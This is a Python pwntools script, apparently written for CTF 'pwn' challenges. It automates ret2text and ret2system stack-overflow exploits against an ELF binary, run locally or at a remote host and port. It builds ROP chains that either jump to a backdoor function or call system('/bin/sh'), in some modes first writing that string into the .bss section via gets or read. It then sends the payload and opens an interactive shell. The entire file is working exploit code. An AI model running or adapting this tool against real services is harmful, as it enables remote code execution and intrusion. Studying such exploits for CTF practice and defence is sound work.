# -*- coding: utf-8 -*-
# @Time     : 2023/11/16 23:01
# @Author   : 君叹
# @File     : ret2text.py

import argparse

parser = argparse.ArgumentParser(description="Process some integers")
parser.add_argument('-t', type=str, help='本地 or 远程地址')
parser.add_argument('-p', type=int, help='端口号')
parser.add_argument('-m', type=str, help='模式')
parser.add_argument('-f', type=str, help='write模式下写入/bin/sh的函数 gets write')

arg_list = parser.parse_args()
from pwn import *

elf = ELF('./pwn')

context(arch=elf.arch, os=elf.os, log_level='debug')

rop = ROP(elf)
ebp_len = 4 if elf.bits == 32 else 8

if elf.bits != 32 and elf.bits != 64:
    log.error("此脚本暂时不支持本架构")
    exit()

# 三种情况，backdoor, nowrite, write
if arg_list.t == 'local':
    io = process("./pwn")
else:
    io = remote(arg_list.t, arg_list.p)

# 这里可以直接把地址写上，后续就不会询问了
backdoor = None
ret = 0
buf_length = None
bin_sh = None
pop_rdi = None
bss = None

to_binsh_flag = 0


def get_value(name):
    try:
        value = input(f"{name} address(In hexadecimal, please start with 0x): ")
        value = int(value, 16) if '0x' in value else int(value)
        return value
    except:
        return elf.sym[value.strip('\n')]





buf_length = get_value('buf_length') if buf_length is None else buf_length

if arg_list.m == 'backdoor':
    # 这里允许输入函数名 or 函数地址
    backdoor = get_value('backdoor') if backdoor is None else backdoor

    # 这里不需要寄存器传参，只需要考虑是否堆栈平衡
    if ret == 0:
        if elf.bits == 64:
            log.info('是否启用堆栈平衡？(yes or no)')
            yesOrno = input().strip("\n")
            if 'no' not in yesOrno:
                log.info("是否自动查找 ret 地址？(yes or no): ")
                yesOrno = input()
                if 'no' in yesOrno:
                    ret = get_value('ret')
                else:
                    ret = rop.ret.address
                log.success("ret address ==> %x" % ret)
    log.success("backdoor address ==> %x" % backdoor)
    payload = flat([cyclic(buf_length + ebp_len), backdoor]) if ret == 0 else \
        flat([cyclic(buf_length + ebp_len), ret, backdoor])

elif arg_list.m == 'nowrite':
    # 这种情况就是
    # 程序中存在 /bin/sh\x00 字符串
    # 并且存在 system 函数
    system = elf.sym['system']
    if bin_sh is None:
        log.info("是否自动查找/bin/sh地址？")
        yesOrno = input()
        if 'no' in yesOrno:
            bin_sh = get_value('bin_sh') if bin_sh is None else bin_sh
        else:
            bin_sh = next(elf.search(b'/bin/sh'))
    log.success("/bin/sh address ==> %x" % bin_sh)
    # 32位不需要 pop rdi
    if elf.bits == 32:
        payload = flat([cyclic(buf_length + ebp_len), system, 0, bin_sh])
    elif elf.bits == 64:
        if pop_rdi is None:
            log.info("是否自动查找 pop rdi; ret 指令？")
            yesOrno = input()
            if 'no' in yesOrno:
                pop_rdi = get_value('pop rdi; ret;')
            else:
                pop_rdi = rop.rdi.address
            log.success("pop_rdi address ==> %x" % pop_rdi)

        log.info('是否启用堆栈平衡？(yes or no)')
        yesOrno = input()
        if 'no' not in yesOrno:
            log.info("是否自动查找 ret 地址？(yes or no): ")
            yesOrno = input()
            if yesOrno == 'no':
                ret = get_value('ret')
            else:
                ret = rop.ret.address
            log.success("ret address ==> %x" % ret)
        else:
            ret = 0

        payload = flat([cyclic(buf_length + ebp_len), pop_rdi, bin_sh, system]) if ret == 0 else \
            flat([cyclic(buf_length + ebp_len), ret, pop_rdi, bin_sh, system])


elif arg_list.m == 'write':
    # 有 system, /bin/sh 需要写入
    # 需要 bss 段
    # gets or read 地址
    # gets 需要一个参数 ,read 需要3个
    to_binsh_flag = 1
    if arg_list.f == 'gets':
        if bss is None:
            log.info("是否自动查找 bss 段地址？")
            yesOrno = input()
            if 'no' in yesOrno:
                bss = get_value('bss') if bss is None else bss
            else:
                bss = elf.sym['__bss_start']
        gets = elf.sym['gets']
        system = elf.sym['system']
        if elf.bits == 64:
            if pop_rdi is None:
                log.info("是否自动查找 pop rdi; ret 指令？")
                yesOrno = input()
                if 'no' in yesOrno:
                    pop_rdi = get_value('pop rdi; ret;')
                else:
                    pop_rdi = rop.rdi.address
                log.success("pop_rdi address ==> %x" % pop_rdi)

            log.info('是否启用堆栈平衡？(yes or no)')
            yesOrno = input()
            if 'no' not in yesOrno:
                log.info("是否自动查找 ret 地址？(yes or no): ")
                yesOrno = input()
                if yesOrno == 'no':
                    ret = get_value('ret')
                else:
                    ret = rop.ret.address
                log.success("ret address ==> %x" % ret)

            payload = flat(
                [cyclic(buf_length + ebp_len), pop_rdi, bss, gets, pop_rdi, bss, system]) if ret == 0 else flat(
                [cyclic(buf_length + ebp_len), ret, pop_rdi, bss, gets, pop_rdi, bss, system]
            )
        else:
            payload = flat([cyclic(buf_length + ebp_len), gets, system, bss, bss])

    elif arg_list.f == 'read':

        if bss is None:
            log.info("是否自动查找 bss 段地址？")
            yesOrno = input()
            if 'no' in yesOrno:
                bss = get_value('bss') if bss is None else bss
            else:
                bss = elf.sym['__bss_start']
        read = elf.sym['read']
        system = elf.sym['system']
        if elf.bits == 64:
            # 两种，有 rdi, rsi, rdx
            # 有 rdi,rsi没rdx

            pop_rdi = get_value('pop_rdi') if pop_rdi is None else pop_rdi
            log.error("这种情况寄存器结构有点乱，自己写下这里的代码吧")
            exit()
        else:
            payload = cyclic(0x12 + 4) + p32(read) + p32(system) + p32(0) + p32(bss) + p32(0x10) + p32(bss)

    else:
        log.error("暂时没这个函数，要不改下代码？")
        exit()
else:
    log.error("模式输入有误，-h 查看参数帮助")
    exit()

log.info("是否检测目标字符串后输出？")
yesOrno = input()
if 'no' in yesOrno:
    io.sendline(payload)
else:
    io.sendlineafter(input("请输入:\n").strip(),payload)
if to_binsh_flag == 1:
    io.sendline(b"/bin/sh\x00")
io.interactive()
